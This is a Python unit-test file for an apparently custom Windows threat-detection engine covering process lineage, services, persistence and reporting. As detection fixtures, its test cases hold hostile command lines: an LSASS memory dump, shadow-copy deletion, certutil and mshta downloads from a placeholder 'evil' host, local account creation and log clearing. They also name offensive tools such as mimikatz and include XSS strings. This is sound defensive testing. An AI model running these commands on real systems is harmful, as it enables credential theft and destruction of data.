"""Unit tests for the detection engine. Run with:  python -m unittest discover -s tests -v"""

import json
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from agent import pathutils  # noqa: E402
from agent.alerts import apply_suppressions, build_alert, correlate, severity_from_score  # noqa: E402
from agent.baseline import build_baseline  # noqa: E402
from agent.demo import build_demo  # noqa: E402
from agent.engine import build_summary, label_processes, run_detection  # noqa: E402
from agent.persistence_rules import analyze_startup, analyze_tasks  # noqa: E402
from agent.process_rules import ProcessIndex, analyze_processes  # noqa: E402
from agent.reporting import Redactor, render_html, write_reports  # noqa: E402
from agent.rules_data import RULE_CATALOG, SUSPICIOUS_PARENT_CHILD  # noqa: E402
from agent.service_rules import analyze_services  # noqa: E402

T0 = 1_700_000_000.0
SYS32 = r"C:\Windows\System32"


def proc(pid, ppid, name, path=None, cmd="", sig="Valid", age=0, user="LAB\\user", **kw):
    path = path if path is not None else rf"{SYS32}\{name}"
    data = {"pid": pid, "ppid": ppid, "name": name, "path": path, "cmdline": cmd or path, "sig_status": sig,
            "signer": "Microsoft Corporation" if sig == "Valid" else None, "create_time": T0 + age,
            "username": user, "sha256": "", "image_missing": False}
    data.update(kw)
    return data


def svc(name, path, start="Auto", account="LocalSystem", sig="Valid"):
    return {"name": name, "display_name": name, "state": "Running", "start_mode": start, "start_name": account,
            "path": path, "exe": pathutils.parse_exe(path), "sig_status": sig, "signer": None, "sha256": ""}


def rules(alerts):
    return {a["rule_id"] for a in alerts}


def find(alerts, rule_id, name=None):
    return [a for a in alerts if a["rule_id"] == rule_id and (name is None or a["name"] == name)]


class PathUtilTests(unittest.TestCase):
    def test_parse_exe_variants(self):
        self.assertEqual(pathutils.parse_exe(r'"C:\Program Files\A B\x.exe" -k y'), r"C:\Program Files\A B\x.exe")
        self.assertEqual(pathutils.parse_exe(r"C:\Program Files\A B\x.exe -run"), r"C:\Program Files\A B\x.exe")
        self.assertEqual(pathutils.parse_exe(r"C:\Windows\system32\svchost.exe -k netsvcs -p"), r"C:\Windows\system32\svchost.exe")
        self.assertEqual(pathutils.parse_exe(""), "")

    def test_unquoted_paths(self):
        self.assertTrue(pathutils.is_unquoted_with_spaces(r"C:\Program Files\Vendor App\svc.exe -run"))
        self.assertFalse(pathutils.is_unquoted_with_spaces(r'"C:\Program Files\Vendor App\svc.exe" -run'))
        self.assertFalse(pathutils.is_unquoted_with_spaces(r"C:\Windows\system32\svchost.exe -k netsvcs"))
        self.assertFalse(pathutils.is_unquoted_with_spaces(None))

    def test_tiers(self):
        self.assertEqual(pathutils.writable_tier(r"C:\Users\a\AppData\Local\Temp\x.exe"), "temp")
        self.assertEqual(pathutils.writable_tier(r"C:\Users\Public\x.exe"), "temp")
        self.assertEqual(pathutils.writable_tier(r"C:\Users\a\Downloads\x.exe"), "temp")
        self.assertEqual(pathutils.writable_tier(r"C:\Users\a\AppData\Roaming\x.exe"), "profile")
        self.assertIsNone(pathutils.writable_tier(r"C:\Program Files\App\x.exe"))
        self.assertIsNone(pathutils.writable_tier(r"C:\Users\a\Desktop\x.exe"))
        self.assertEqual(pathutils.writable_tier(r"C:\Users\a\Desktop\x.exe", strict=True), "profile")
        self.assertIsNone(pathutils.writable_tier(r"C:\Program Files\WindowsApps\Pkg\x.exe"))
        self.assertIsNone(pathutils.writable_tier(r"C:\Users\a\AppData\Local\Microsoft\WindowsApps\Pkg\x.exe"))

    def test_levenshtein(self):
        self.assertEqual(pathutils.levenshtein("scvhost.exe", "svchost.exe"), 2)
        self.assertEqual(pathutils.levenshtein("abc", "abc"), 0)
        self.assertEqual(pathutils.levenshtein("", "abc"), 3)


class SeverityTests(unittest.TestCase):
    def test_boundaries(self):
        self.assertEqual([severity_from_score(s) for s in (1, 2, 3, 5, 6, 8, 9, 10)],
                         ["LOW", "LOW", "MEDIUM", "MEDIUM", "HIGH", "HIGH", "CRITICAL", "CRITICAL"])

    def test_catalog_complete(self):
        for rule_id, meta in RULE_CATALOG.items():
            for key in ("name", "alert_type", "tactic", "technique", "description", "recommendation"):
                self.assertTrue(meta[key], f"{rule_id} missing {key}")


class ProcessRuleTests(unittest.TestCase):
    def analyze(self, processes, **kw):
        label_processes({"processes": processes}, {})
        return analyze_processes(processes, **kw)

    def test_office_to_powershell(self):
        procs = [proc(10, 1, "winword.exe", r"C:\Program Files\Microsoft Office\WINWORD.EXE"),
                 proc(11, 10, "powershell.exe", age=5)]
        alerts = self.analyze(procs)
        hit = find(alerts, "PROC-001", "powershell.exe")
        self.assertEqual(len(hit), 1)
        self.assertEqual(hit[0]["severity"], "HIGH")
        self.assertIn("winword.exe(10)", hit[0]["evidence"]["lineage"])

    def test_browser_native_messaging_is_downgraded(self):
        procs = [proc(10, 1, "brave.exe", r"C:\Program Files\Brave\brave.exe"),
                 proc(11, 10, "cmd.exe", cmd=r"cmd.exe /d /s /c host.exe chrome-extension://abc/", age=5)]
        alert = find(self.analyze(procs), "PROC-001")[0]
        self.assertEqual(alert["severity"], "LOW")

    def test_normal_parent_child_is_clean(self):
        procs = [proc(10, 1, "explorer.exe", r"C:\Windows\explorer.exe"), proc(11, 10, "cmd.exe", age=5),
                 proc(12, 11, "powershell.exe", age=6)]
        self.assertNotIn("PROC-001", rules(self.analyze(procs)))

    def test_pid_reuse_does_not_create_false_parent(self):
        # "parent" PID 10 started AFTER the child: recycled PID, must not be treated as the parent
        procs = [proc(10, 1, "winword.exe", r"C:\Program Files\Office\WINWORD.EXE", age=100),
                 proc(11, 10, "cmd.exe", age=5)]
        self.assertNotIn("PROC-001", rules(self.analyze(procs)))
        self.assertIsNone(ProcessIndex(procs).parent_of(procs[1]))

    def test_masquerading_location_and_parent(self):
        procs = [proc(1, 0, "explorer.exe", r"C:\Windows\explorer.exe"),
                 proc(2, 1, "svchost.exe", r"C:\Users\Public\svchost.exe", sig="NotSigned", age=5)]
        found = rules(self.analyze(procs))
        self.assertTrue({"PROC-005", "PROC-007", "PROC-002"} <= found)

    def test_legit_svchost_clean(self):
        procs = [proc(1, 0, "services.exe"), proc(2, 1, "svchost.exe", age=5)]
        self.assertFalse(rules(self.analyze(procs)) & {"PROC-005", "PROC-007", "PROC-006"})

    def test_lookalike(self):
        procs = [proc(1, 0, "explorer.exe", r"C:\Windows\explorer.exe"),
                 proc(2, 1, "scvhost.exe", r"C:\Users\a\AppData\Roaming\scvhost.exe", sig="NotSigned", age=5)]
        self.assertIn("PROC-006", rules(self.analyze(procs)))

    def test_lookalike_skipped_when_validly_signed(self):
        procs = [proc(2, 0, "svhost.exe", r"C:\Program Files\Vendor\svhost.exe", sig="Valid")]
        self.assertNotIn("PROC-006", rules(self.analyze(procs)))

    def test_blacklist_and_keyword(self):
        for name in ("mimikatz.exe", "xmrig.exe", "my_mimikatz_copy.exe"):
            procs = [proc(2, 0, name, rf"C:\Tools\{name}", sig="NotSigned")]
            alerts = find(self.analyze(procs), "PROC-004")
            self.assertEqual(len(alerts), 1, name)
            self.assertIn(alerts[0]["severity"], ("HIGH", "CRITICAL"))

    def test_custom_blacklist(self):
        procs = [proc(2, 0, "badtool.exe", r"C:\Program Files\X\badtool.exe")]
        self.assertIn("PROC-004", rules(analyze_processes(procs, {"blacklisted_processes": ["badtool.exe"]})))

    def test_unsigned_unlisted_and_signed_unlisted(self):
        unsigned = proc(2, 0, "weird.exe", r"C:\Tools\weird.exe", sig="NotSigned")
        signed = proc(3, 0, "vendorapp.exe", r"C:\Program Files\Vendor\vendorapp.exe", sig="Valid")
        alerts = self.analyze([unsigned, signed])
        self.assertEqual(len(find(alerts, "PROC-003", "weird.exe")), 1)
        self.assertEqual(find(alerts, "PROC-003", "vendorapp.exe"), [])

    def test_unsigned_in_program_files_is_low(self):
        alerts = self.analyze([proc(2, 0, "tail.exe", r"C:\Program Files\Git\usr\bin\tail.exe", sig="NotSigned")])
        self.assertEqual(find(alerts, "PROC-003")[0]["severity"], "LOW")

    def test_allowlist_extension(self):
        p = proc(2, 0, "weird.exe", r"C:\Tools\weird.exe", sig="NotSigned")
        self.assertEqual(find(analyze_processes([p], {"allowed_processes": ["weird.exe"]}), "PROC-003"), [])

    def test_packaged_apps_not_flagged(self):
        p = proc(2, 0, "WhatsApp.Root.exe", r"C:\Program Files\WindowsApps\Pkg_1.0\WhatsApp.Root.exe", sig="NotSigned")
        self.assertFalse(rules(self.analyze([p])) & {"PROC-003", "PROC-013", "PROC-002"})

    def test_bare_kernel_names_ignored(self):
        p = proc(2, 0, "MemCompression", "MemCompression", sig=None)
        self.assertEqual(self.analyze([p]), [])

    def test_command_line_patterns(self):
        cases = {
            "powershell.exe -nop -enc " + "A" * 40: "Encoded PowerShell",
            "cmd /c vssadmin delete shadows /all /quiet": "Shadow copy",
            "certutil -urlcache -f http://x/a.exe a.exe": "Certutil",
            "mshta http://evil/x.hta": "Mshta",
            "regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll": "Regsvr32",
            "rundll32 comsvcs.dll, MiniDump 600 out.dmp full": "LSASS",
            "net user hacker Passw0rd /add": "Local account",
            "powershell -w hidden -ExecutionPolicy Bypass -File x.ps1": "hidden window",
            "wevtutil cl Security": "Clear event logs",
        }
        for cmd, label in cases.items():
            p = proc(5, 0, "cmd.exe", cmd=cmd)
            alerts = find(self.analyze([p]), "PROC-008")
            self.assertTrue(alerts, cmd)
            self.assertTrue(any(label.lower() in a["reason"].lower() for a in alerts), (cmd, [a["reason"] for a in alerts]))

    def test_benign_command_lines_clean(self):
        for cmd in ("cmd.exe /c dir", "powershell.exe -NoProfile -Command Get-Process",
                    r"C:\Windows\system32\svchost.exe -k netsvcs -p", "python.exe app.py"):
            self.assertEqual(find(self.analyze([proc(5, 0, "cmd.exe", cmd=cmd)]), "PROC-008"), [], cmd)

    def test_ransomware_precursor_is_critical(self):
        p = proc(5, 0, "cmd.exe", cmd="cmd /c vssadmin delete shadows /all")
        self.assertEqual(find(self.analyze([p]), "PROC-008")[0]["severity"], "CRITICAL")

    def test_duplicate_singleton(self):
        procs = [proc(1, 0, "lsass.exe", age=0), proc(2, 0, "lsass.exe", age=50)]
        dup = find(self.analyze(procs), "PROC-009")
        self.assertEqual([a["pid"] for a in dup], [2])

    def test_system_process_odd_path(self):
        p = proc(2, 0, "helper.exe", r"C:\Tools\helper.exe", sig="NotSigned", user=r"NT AUTHORITY\SYSTEM")
        self.assertIn("PROC-010", rules(self.analyze([p])))

    def test_deleted_image(self):
        p = proc(2, 0, "ghost.exe", r"C:\Tools\ghost.exe", sig="Valid", image_missing=True)
        self.assertIn("PROC-011", rules(self.analyze([p])))

    def test_double_extension(self):
        self.assertIn("PROC-012", rules(self.analyze([proc(2, 0, "invoice.pdf.exe", r"C:\x\invoice.pdf.exe", sig="NotSigned")])))
        self.assertNotIn("PROC-012", rules(self.analyze([proc(2, 0, "setup.exe", r"C:\x\setup.exe")])))

    def test_signature_problems(self):
        bad = proc(2, 0, "cmd.exe", sig="HashMismatch")
        self.assertIn("PROC-013", rules(self.analyze([bad])))
        unsigned_sys = proc(3, 0, "cmd.exe", sig="NotSigned")
        self.assertIn("PROC-013", rules(self.analyze([unsigned_sys])))

    def test_ioc_hash(self):
        p = proc(2, 0, "thing.exe", r"C:\Program Files\x\thing.exe", sha256="a" * 64)
        self.assertIn("PROC-014", rules(analyze_processes([p], {}, {"a" * 64})))

    def test_trust_labels(self):
        procs = [proc(1, 0, "a.exe", sig="Valid"), proc(2, 0, "b.exe", sig="NotSigned"),
                 proc(3, 0, "c.exe", sig="HashMismatch"), proc(4, 0, "d.exe", sig=None)]
        label_processes({"processes": procs}, {})
        self.assertEqual([p["trust"] for p in procs], ["Signed", "Unsigned", "Invalid signature", "Unverified"])


class ServiceRuleTests(unittest.TestCase):
    def test_binary_in_public_folder(self):
        alerts = analyze_services([svc("Evil", r"C:\Users\Public\e.exe", sig="NotSigned")])
        self.assertEqual(find(alerts, "SVC-001")[0]["severity"], "HIGH")

    def test_unquoted(self):
        alerts = analyze_services([svc("V", r"C:\Program Files\Vendor App\s.exe -run")])
        self.assertIn("SVC-002", rules(alerts))
        self.assertNotIn("SVC-002", rules(analyze_services([svc("V", r'"C:\Program Files\Vendor App\s.exe" -run')])))

    def test_interpreter_service(self):
        alerts = analyze_services([svc("x", r"%COMSPEC% /c echo hi > \\.\pipe\x")])
        self.assertIn("SVC-007", rules(alerts))

    def test_clean_windows_service(self):
        alerts = analyze_services([svc("Dnscache", r"C:\Windows\system32\svchost.exe -k NetworkService -p",
                                       account=r"NT AUTHORITY\NetworkService")])
        self.assertEqual(alerts, [])

    def test_blacklisted_binary(self):
        self.assertIn("SVC-011", rules(analyze_services([svc("PSEXESVC", r"C:\Windows\PSEXESVC.exe", start="Manual")])))

    def test_unsigned_and_invalid(self):
        self.assertIn("SVC-009", rules(analyze_services([svc("a", r"C:\Tools\a.exe", sig="NotSigned")])))
        self.assertEqual(find(analyze_services([svc("b", r"C:\Tools\b.exe", sig="HashMismatch")]), "SVC-009")[0]["severity"], "HIGH")

    def test_acl_findings(self):
        service = svc("Backup", r"C:\Tools\b.exe", sig="Valid")
        acl = {"Backup": {"file_writable_by": ["Users"], "dir_writable_by": [], "key_writable_by": ["Everyone"]}}
        found = rules(analyze_services([service], acl_results=acl))
        self.assertTrue({"SVC-008", "SVC-010"} <= found)

    def test_non_standard_autostart_system(self):
        self.assertIn("SVC-006", rules(analyze_services([svc("x", r"C:\Tools\x.exe", sig="NotSigned")])))
        self.assertNotIn("SVC-006", rules(analyze_services([svc("x", r"C:\Tools\x.exe", sig="Valid")])))

    def test_trusted_service_name(self):
        out = analyze_services([svc("Evil", r"C:\Users\Public\e.exe", sig="NotSigned")],
                               custom={"trusted_service_names": ["evil"]})
        self.assertEqual(out, [])

    def test_baseline_new_modified_removed(self):
        before = [svc("Keep", r"C:\Program Files\K\k.exe"), svc("Change", r"C:\Program Files\C\c.exe"),
                  svc("Gone", r"C:\Program Files\G\g.exe")]
        baseline = build_baseline({"services": before})["services"]
        after = [svc("Keep", r"C:\Program Files\K\k.exe"), svc("Change", r"C:\Users\Public\c.exe", sig="NotSigned"),
                 svc("Fresh", r"C:\Program Files\F\f.exe")]
        alerts = analyze_services(after, baseline=baseline)
        self.assertEqual(len(find(alerts, "SVC-003", "Fresh")), 1)
        changed = find(alerts, "SVC-004", "Change")
        self.assertEqual(len(changed), 1)
        self.assertEqual(changed[0]["severity"], "CRITICAL")
        self.assertEqual(changed[0]["evidence"]["changes"]["path"]["before"], r"C:\Program Files\C\c.exe")
        self.assertEqual(len(find(alerts, "SVC-005", "Gone")), 1)
        self.assertEqual(find(alerts, "SVC-003", "Keep") + find(alerts, "SVC-004", "Keep"), [])

    def test_start_mode_flip_on_signed_windows_service_is_low(self):
        win = r"C:\Windows\System32\svchost.exe -k netsvcs -p"
        base = build_baseline({"services": [svc("BITS", win, start="Manual")]})["services"]
        self.assertEqual(find(analyze_services([svc("BITS", win, start="Auto")], baseline=base), "SVC-004")[0]["severity"], "LOW")
        # a third-party binary switching to Auto is still reported above LOW
        vendor = r"C:\Program Files\V\v.exe"
        base = build_baseline({"services": [svc("Vendor", vendor, start="Manual")]})["services"]
        self.assertNotEqual(find(analyze_services([svc("Vendor", vendor, start="Auto")], baseline=base), "SVC-004")[0]["severity"], "LOW")
        # Disabled -> Auto on a system service is never downgraded
        sysbin = r"C:\Windows\System32\x.exe"
        base = build_baseline({"services": [svc("X", sysbin, start="Disabled")]})["services"]
        self.assertNotEqual(find(analyze_services([svc("X", sysbin, start="Auto")], baseline=base), "SVC-004")[0]["severity"], "LOW")

    def test_no_baseline_means_no_drift_alerts(self):
        alerts = analyze_services([svc("Fresh", r"C:\Program Files\F\f.exe")], baseline=None)
        self.assertNotIn("SVC-003", rules(alerts))

    def test_state_change_is_not_drift(self):
        s = svc("S", r"C:\Program Files\S\s.exe")
        baseline = build_baseline({"services": [s]})["services"]
        s2 = dict(s, state="Stopped")
        self.assertEqual(find(analyze_services([s2], baseline=baseline), "SVC-004"), [])


class PersistenceTests(unittest.TestCase):
    def entry(self, name, exe, sig="Valid", location="HKCU\\Run", command=None):
        return {"location": location, "name": name, "command": command or exe, "exe": exe, "sig_status": sig}

    def test_run_key_in_temp(self):
        alerts = analyze_startup([self.entry("x", r"C:\Windows\Temp\x.exe", sig="NotSigned")])
        self.assertEqual(find(alerts, "PERS-002")[0]["severity"], "HIGH")

    def test_signed_program_files_clean(self):
        self.assertEqual(analyze_startup([self.entry("OneDrive", r"C:\Program Files\OneDrive\od.exe")]), [])

    def test_new_vs_baseline(self):
        e = self.entry("New", r"C:\Program Files\X\x.exe")
        self.assertEqual(find(analyze_startup([e], baseline={}), "PERS-001")[0]["name"], "New")
        self.assertEqual(analyze_startup([e], baseline={"HKCU\\Run|New": "x"}), [])
        self.assertEqual(analyze_startup([e], baseline=None), [])

    def test_task_with_bypass(self):
        task = {"task_path": "\\", "name": "t", "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Users\\Public\\s.ps1",
                "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "sig_status": "Valid"}
        found = rules(analyze_tasks([task], baseline={}))
        self.assertTrue({"PERS-003", "PERS-004"} <= found)


class AlertTests(unittest.TestCase):
    def test_correlation_boosts_severity(self):
        a = build_alert("PROC-003", 3, "r1", entity="proc:1:x")
        b = build_alert("PROC-002", 4, "r2", entity="proc:1:x")
        out = correlate([a, b])
        corr = find(out, "CORR-001")
        self.assertEqual(len(corr), 1)
        self.assertEqual(corr[0]["severity"], "HIGH")

    def test_no_correlation_for_same_rule_or_other_entity(self):
        a = build_alert("PROC-008", 6, "r1", entity="proc:1:x")
        b = build_alert("PROC-008", 6, "r2", entity="proc:1:x")
        c = build_alert("PROC-002", 4, "r3", entity="proc:2:y")
        self.assertEqual(find(correlate([a, b, c]), "CORR-001"), [])

    def test_suppressions(self):
        a = build_alert("PROC-003", 3, "r", entity="e1", name="Tool.exe", path=r"C:\Tools\Tool.exe")
        kept, n = apply_suppressions([a], [{"rule_id": "PROC-003", "name": "tool.exe"}])
        self.assertEqual((kept, n), ([], 1))
        kept, n = apply_suppressions([a], [{"rule_id": "PROC-002"}])
        self.assertEqual((len(kept), n), (1, 0))
        kept, n = apply_suppressions([a], [{"path_contains": "\\tools\\"}])
        self.assertEqual(n, 1)
        kept, n = apply_suppressions([a], [{}])          # empty rule must never match everything
        self.assertEqual(n, 0)

    def test_alert_ids_stable(self):
        a = build_alert("PROC-003", 3, "same", entity="e")
        b = build_alert("PROC-003", 3, "same", entity="e")
        self.assertEqual(a["alert_id"], b["alert_id"])

    def test_every_technique_id_has_a_name_and_matches_catalog(self):
        from agent.rules_data import COMMAND_LINE_PATTERNS, TECHNIQUES
        used = {m["technique"] for m in RULE_CATALOG.values() if m["technique"] != "-"}
        used |= {t for _, _, _, t in COMMAND_LINE_PATTERNS}
        for children in SUSPICIOUS_PARENT_CHILD.values():
            used |= {tech for _, tech, _ in children.values()}
        self.assertEqual(sorted(used - set(TECHNIQUES)), [])
        for rule_id, meta in RULE_CATALOG.items():
            if meta["technique"] != "-":
                self.assertEqual(TECHNIQUES[meta["technique"]][0], meta["technique_name"], rule_id)

    def test_overridden_technique_gets_matching_name_and_tactic(self):
        alert = build_alert("PROC-008", 10, "r", entity="e", technique="T1490")
        self.assertEqual((alert["mitre_technique"], alert["mitre_tactic"]), ("Inhibit System Recovery", "Impact"))

    def test_every_parent_child_rule_has_valid_shape(self):
        for parent, children in SUSPICIOUS_PARENT_CHILD.items():
            for child, (score, technique, note) in children.items():
                self.assertTrue(1 <= score <= 10 and technique.startswith("T") and note, (parent, child))


class DemoAndReportTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.snapshot, cls.baseline = build_demo()
        label_processes(cls.snapshot, {})
        cls.alerts, _ = run_detection(cls.snapshot, cls.baseline, {}, set())

    def test_demo_triggers_every_major_rule_family(self):
        expected = {"PROC-001", "PROC-002", "PROC-003", "PROC-004", "PROC-005", "PROC-006", "PROC-007", "PROC-008",
                    "PROC-009", "PROC-010", "PROC-011", "PROC-012", "PROC-013", "SVC-001", "SVC-002", "SVC-003",
                    "SVC-004", "SVC-005", "SVC-007", "SVC-008", "SVC-009", "SVC-010", "SVC-011", "PERS-001",
                    "PERS-002", "PERS-003", "PERS-004", "CORR-001"}
        self.assertEqual(expected - rules(self.alerts), set())

    def test_demo_has_critical_findings_and_benign_baseline_is_clean(self):
        self.assertTrue(any(a["severity"] == "CRITICAL" for a in self.alerts))
        benign = {"System", "smss.exe", "wininit.exe", "winlogon.exe", "services.exe", "explorer.exe", "chrome.exe", "Code.exe"}
        noisy = [a for a in self.alerts if a["name"] in benign and a["rule_id"] != "CORR-001"
                 and not (a["name"] == "svchost.exe")]
        self.assertEqual([(a["rule_id"], a["name"]) for a in noisy], [])

    def test_office_chain_escalated(self):
        chain = [a for a in self.alerts if a["rule_id"] == "CORR-001" and "Attack chain" in a["reason"]]
        self.assertTrue(chain)
        self.assertEqual(chain[0]["severity"], "CRITICAL")

    def test_alerts_sorted_by_score(self):
        scores = [a["score"] for a in self.alerts]
        self.assertEqual(scores, sorted(scores, reverse=True))

    def test_summary_consistency(self):
        summary = build_summary(self.snapshot, self.alerts, mode="demo")
        total = sum(summary[f"{s}_alerts"] for s in ("critical", "high", "medium", "low"))
        self.assertEqual(total, summary["total_alerts"], len(self.alerts))
        self.assertTrue(summary["mitre_techniques"])

    def test_report_files_round_trip(self):
        summary = build_summary(self.snapshot, self.alerts, mode="demo")
        with tempfile.TemporaryDirectory() as tmp:
            files = write_reports(Path(tmp), self.snapshot, self.alerts, summary, Redactor(False))
            data = json.loads(files["alerts_json"].read_text(encoding="utf-8"))
            self.assertEqual(data["total_alerts"], len(self.alerts))
            self.assertEqual(json.loads(files["summary"].read_text(encoding="utf-8"))["mode"], "demo")
            header = files["alerts_csv"].read_text(encoding="utf-8").splitlines()[0]
            self.assertTrue(header.startswith("timestamp,severity,score,rule_id"))
            page = files["html"].read_text(encoding="utf-8")
            self.assertIn("DEMO MODE", page)
            self.assertIn("MITRE", page)

    def test_html_escapes_untrusted_values(self):
        evil = build_alert("PROC-003", 3, "<script>alert(1)</script>", entity="e", name="<img src=x onerror=1>")
        page = render_html(build_summary({"processes": []}, [evil], mode="live"), [evil], {})
        self.assertNotIn("<script>alert(1)", page)
        self.assertNotIn("<img src=x", page)


class RedactionTests(unittest.TestCase):
    def test_user_and_host_redacted(self):
        import os
        redactor = Redactor(True)
        user = os.environ.get("USERNAME") or "tester"
        if len(user) >= 3:
            self.assertNotIn(user.lower(), redactor(f"C:\\Users\\{user}\\x").lower())
        self.assertEqual(Redactor(False)("C:\\Users\\bob"), "C:\\Users\\bob")


if __name__ == "__main__":
    unittest.main()
